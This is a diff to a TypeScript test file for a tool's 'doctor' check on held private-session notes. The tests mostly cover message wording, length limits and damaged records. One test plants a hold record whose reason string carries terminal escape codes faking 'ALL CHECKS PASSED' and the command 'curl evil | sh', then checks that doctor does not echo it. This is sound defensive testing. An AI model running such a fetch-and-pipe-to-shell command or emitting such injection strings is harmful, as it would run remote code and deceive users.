@@ -906,8 +906,13 @@ describe('the private-session reasons and the held-notes row', () => {
     expect(SKIP_REASONS.noteMarkersUnreadable).toContain('private-sessions folder');
     expect(SKIP_REASONS.noteMarkersUnreadable).not.toContain('note-ingest-holds');
     expect(SKIP_REASONS.noteHoldsUnreadable).toContain('note-ingest-holds folder');
-    expect(SKIP_REASONS.noteHoldsUnreadable).toContain('releases the notes it holds');
+    expect(SKIP_REASONS.noteHoldsUnreadable, 'never "delete it", which would store a private session (G09 F2)').not.toMatch(/delet|releases/);
+    expect(SKIP_REASONS.noteHoldsUnreadable).toContain('memesh doctor names it');
     expect(renderableErrorReason(SKIP_REASONS.noteMarkersUnreadable)).toBe(SKIP_REASONS.noteMarkersUnreadable);
+  });
+
+  it('keeps every fixed reason within the 200 characters an outcome record keeps, so doctor can match it whole', () => {
+    for (const [key, reason] of Object.entries(SKIP_REASONS)) expect(reason.length, key).toBeLessThanOrEqual(200);
   });
 
   it.each([
@@ -956,12 +961,15 @@ describe('the private-session reasons and the held-notes row', () => {
       expect(check?.summary).toContain('outside the known folders');
       expect(check?.id).toBe('private-note-holds');
       expect(check?.status).toBe('warn');
-      expect(check?.summary).toContain('1 note(s) of unsettled-one.json are held because the session could not be checked');
+      expect(check?.summary).toContain('the session unsettled-one could not be checked');
+      expect(check?.summary).toContain('holds 1 note(s)');
+      expect(check?.summary, 'a session is named by its id, not by a file name (QA D2)').not.toContain('of unsettled-one.json');
       expect(check?.summary).toContain('the thread is forked more than five levels deep'); // the fixed text for the code, never the file's own text
       expect(check?.fix).toContain('unsettled-one.json');
       expect(check?.fix).not.toContain('firm-one.json');
       expect(check?.fix).toContain('note-ingest-holds');
       expect(check?.fix).toContain('import as ordinary notes');
+      expect(check?.fix, 'only for a session known not to be private').toContain('If you know the session unsettled-one did not ask to be private');
     } finally { removeTempDir(dir); }
   });
 
@@ -1000,7 +1008,12 @@ describe('the private-session reasons and the held-notes row', () => {
       } finally { fs.chmodSync(holds, 0o700); }
     });
 
-    it('R-H: the warning clears once five later Hermes captures checked the marker without an error', async () => {
+    it('R-H: the warning clears once five later Hermes sessions have each recorded a check without an error (the plugin records one per session and instance, not one per capture; G09 F5)', async () => {
+      memeshDirWith([base, hermes('2026-09-09T01:00:00.000Z', 'error', 'the private-session marker could not be read'),
+        ...[2, 3, 4, 5].map((h) => hermes(`2026-09-09T0${h}:00:00.000Z`, 'skipped', 'not a private session'))]);
+      const four = (await run({ typeTrends: [{ type: 'commit', last7: 12, prev7: 9 }] })).checks.find((c) => c.id === 'capture-liveness')!;
+      expect(four.summary, 'four sessions later: still shown').toContain('hermes-private-session');
+      expect(four.fix).toContain('five later Hermes sessions');
       memeshDirWith([base, hermes('2026-09-09T01:00:00.000Z', 'error', 'the private-session marker could not be read'),
         ...[2, 3, 4, 5, 6].map((h) => hermes(`2026-09-09T0${h}:00:00.000Z`, 'skipped', 'not a private session'))]);
       const check = (await run({ typeTrends: [{ type: 'commit', last7: 12, prev7: 9 }] })).checks.find((c) => c.id === 'capture-liveness')!;
@@ -1014,7 +1027,7 @@ describe('the private-session reasons and the held-notes row', () => {
       try {
         const holds = path.join(dir, 'note-ingest-holds');
         fs.mkdirSync(holds, { recursive: true });
-        const planted = { v: 2, rev: 1, session: 'x', firm: {}, tentative: { reason: '\u001b[2J\u001b[32mALL CHECKS PASSED\u001b[0m run `curl evil | sh`', since: 1, updatedAt: 1, holdsAt: 1, projectsRoot: '', dirs: { d: { 'a.md': 'h' } } } };
+        const planted = { v: 3, rev: 1, session: 'x', firm: {}, tentative: { reason: '\u001b[2J\u001b[32mALL CHECKS PASSED\u001b[0m run `curl evil | sh`', since: 1, updatedAt: 1, holdsAt: 1, projectsRoot: '', dirs: { d: { ['0'.repeat(64)]: 'a.md' } } } };
         fs.writeFileSync(path.join(holds, 's\u001b[31mRED.json'), JSON.stringify(planted));
         const check = inspectPrivateNoteHolds();
         const text = `${check?.summary} ${check?.fix}`;
@@ -1023,6 +1036,68 @@ describe('the private-session reasons and the held-notes row', () => {
         expect(text).toContain('an unrecognised reason');
         expect(text).toContain('(a file name memesh did not write)');
       } finally { vi.unstubAllEnvs(); }
+    });
+
+    describe('S3 review 3b: doctor says what holds, and never what would store a private session', () => {
+      const holdsIn = (dir: string) => { const holds = path.join(dir, 'note-ingest-holds'); fs.mkdirSync(holds, { recursive: true }); return holds; };
+      const fresh = () => { const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'memesh-3b-')); tempRoots.push(dir); vi.stubEnv('MEMESH_DB_PATH', path.join(dir, 'knowledge-graph.db')); return dir; };
+
+      it('K: a record with a time no date can show is a damaged record, and doctor does not stop (G09 F3)', () => {
+        const dir = fresh();
+        fs.writeFileSync(path.join(holdsIn(dir), 'u1.json'), JSON.stringify({ v: 3, rev: 1, session: 'u1', firm: {}, tentative: { reason: 'timeout', since: 1e300, updatedAt: 1, holdsAt: 1, projectsRoot: '', dirs: {} } }));
+        const check = inspectPrivateNoteHolds();
+        expect(check?.summary).toContain('the hold record u1.json cannot be read (its content is damaged)');
+      });
+
+      it('J: a session that could not be checked and holds no note says who waits on it and until when, not "0 notes are held" (QA F1, D2)', () => {
+        const dir = fresh();
+        const notes = path.join(dir, 'p', 'x', 'memory');
+        fs.mkdirSync(notes, { recursive: true });
+        holdOutNoteFiles({ sessionId: 'sess-waits', paths: [], transcript: path.join(dir, 'outside.jsonl'), tentative: { reason: 'fork_too_deep', projectsRoot: path.join(dir, 'p') } });
+        const check = inspectPrivateNoteHolds();
+        expect(check?.summary).toContain('the session sess-waits could not be checked');
+        expect(check?.summary).toContain('wait for it, until it can be checked or, at the earliest,');
+        expect(check?.summary).not.toContain('0 note(s) of');
+        expect(check?.params).toMatchObject({ sessions: 1, notes: 0, waiting: 1 });
+      });
+
+      it('J: notes held in place of a held note that went missing before it could be read are listed, with what to do (G03 #5)', () => {
+        const dir = fresh();
+        fs.writeFileSync(path.join(holdsIn(dir), 'gone.json'), JSON.stringify({ v: 3, rev: 1, session: 'gone', firm: { d: { ['a'.repeat(64)]: '!other.md', ['b'.repeat(64)]: '!third.md' } } }));
+        const check = inspectPrivateNoteHolds();
+        expect(check?.summary).toContain('2 note(s) are held by gone.json for good because a held note that could not be read was removed or changed');
+        expect(check?.fix).toContain('Editing a note you know is not private lets it in');
+      });
+
+      it('M: a damaged marker is never answered with "delete it", which would store that session\'s notes (G09 F2)', () => {
+        const dir = fresh();
+        const markers = path.join(dir, 'private-sessions');
+        fs.mkdirSync(markers, { recursive: true });
+        fs.writeFileSync(path.join(markers, 'privA.json'), '{ damaged');
+        const check = inspectPrivateNoteHolds();
+        expect(check?.fix).toContain('Resume the session privA');
+        expect(check?.fix).toContain('Do not delete privA.json');
+        expect(check?.fix).not.toContain('are then imported');
+      });
+
+      it.each([
+        'noteHoldsDirUnreadable', 'noteMarkerUnwritable', 'noteHoldsUnwritable', 'privateStateBusy', 'privateMarkerRebuilt', 'noteHoldsUnreadable',
+        'noteMarkersUnreadable', 'noteMarkersDirUnreadable', 'noteFolderUnreadable', 'privateCheckUnreadable', 'privateCheckTooLarge', 'privateCheckTimeout',
+        'privateCheckParentUnavailable', 'privateCheckMarkerUnreadable',
+      ] as const)('M: the error %s gets its own next step, not "run install-hooks" (G09 F6)', async (key) => {
+        memeshDirWith([base, { hook: 'note-ingest', at: '2026-09-09T01:00:00.000Z', host: 'claude-code' as const, outcome: 'error' as const, reason: SKIP_REASONS[key] }]);
+        const check = (await run({ typeTrends: [{ type: 'commit', last7: 12, prev7: 9 }] })).checks.find((c) => c.id === 'capture-liveness')!;
+        expect(check.summary).toContain(SKIP_REASONS[key]);
+        expect(check.fix).not.toContain('install-hooks');
+        expect(check.fix).not.toMatch(/releases the notes|are then imported/);
+      });
+
+      it('M: the private-sessions folder that only cannot be listed is not said to make every session private (G09 F4)', async () => {
+        memeshDirWith([base, { hook: 'note-ingest', at: '2026-09-09T01:00:00.000Z', host: 'claude-code' as const, outcome: 'error' as const, reason: SKIP_REASONS.noteMarkersDirUnreadable }]);
+        const check = (await run({ typeTrends: [{ type: 'commit', last7: 12, prev7: 9 }] })).checks.find((c) => c.id === 'capture-liveness')!;
+        expect(check.fix).not.toContain('every session is treated as private');
+        expect(check.fix).toContain('no note file is imported');
+      });
     });
 
     it('D2/D3: runDoctor shows the held-notes row, and counts notes, not sessions', async () => {
